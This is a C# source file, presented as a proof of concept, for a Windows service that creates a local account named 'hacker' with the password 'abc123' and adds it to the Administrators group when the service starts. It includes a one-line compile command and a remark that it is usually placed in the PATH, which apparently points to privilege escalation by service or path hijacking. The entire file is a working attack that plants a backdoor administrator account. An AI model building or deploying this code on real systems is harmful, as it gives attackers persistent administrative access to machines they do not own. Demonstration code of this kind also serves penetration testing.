/*
 * @Author: Bret McDanel
 * 
 * Creates a user named "hacker" and adds them to the Administrator group.
 * Runs as a service and generally is placed in the PATH.
 *
 * Can be compiled by executing the following (requires Powershell version 5.x)
 * powershell Add-Type -OutputType ConsoleApplication -Path CreateUser_Service.cs -OutputAssembly CreateUser_Service.exe -ReferencedAssemblies System.DirectoryServices,System.ServiceProcess
 */

using System;
using System.ServiceProcess;
using System.DirectoryServices;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;

[assembly: global::System.Runtime.Versioning.TargetFrameworkAttribute(".NETFramework,Version=v4.7.2", FrameworkDisplayName = ".NET Framework 4.7.2")]
[assembly: AssemblyDescription("PoC to create a user named 'hacker'")]
[assembly: AssemblyConfiguration("Release")]
[assembly: AssemblyCompany("Some Company, Inc.")]
[assembly: AssemblyCopyright("Copyright © Bret McDanel 2023")]
[assembly: AssemblyTrademark("")]
[assembly: AssemblyCulture("")]
[assembly: ComVisible(false)]
[assembly: Guid("75c8e237-e8b4-4d6e-897c-8a6f1033d6e7")]
[assembly: AssemblyProduct("PoC")]
[assembly: AssemblyTitle("CreateUser Service")]
[assembly: AssemblyVersion("1.0.0.0")]
[assembly: AssemblyFileVersion("1.0.0.0")]


namespace CreateUser
{
    partial class CreateUser
    {
        private System.ComponentModel.IContainer components = null;

        protected override void Dispose(bool disposing)
        {
            if (disposing && (components != null))
            {
                components.Dispose();
            }
            base.Dispose(disposing);
        }

        private void InitializeComponent()
        {
            this.ServiceName = "CreateUser";

        }
    }

    public partial class CreateUser : ServiceBase
    {
        public CreateUser()
        {
            InitializeComponent();
        }

        protected override void OnStart(string[] args)
        {
            try
            {
                DirectoryEntry AD = new DirectoryEntry("WinNT://" + Environment.MachineName + ",computer");
                DirectoryEntry NewUser = AD.Children.Add("hacker", "user");
                NewUser.Invoke("SetPassword", new object[] { "abc123" });
                NewUser.Invoke("Put", new object[] { "Description", "PoC User" });
                NewUser.CommitChanges();
                DirectoryEntry grp;

                grp = AD.Children.Find("Administrators", "group");
                if (grp != null) { grp.Invoke("Add", new object[] { NewUser.Path.ToString() }); }
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
            }

        }

        protected override void OnStop()
        {
        }
    }

    internal static class Program
    {
        static void Main()
        {
            ServiceBase[] ServicesToRun;
            ServicesToRun = new ServiceBase[]
            {
                new CreateUser()
            };
            ServiceBase.Run(ServicesToRun);
        }
    }
}
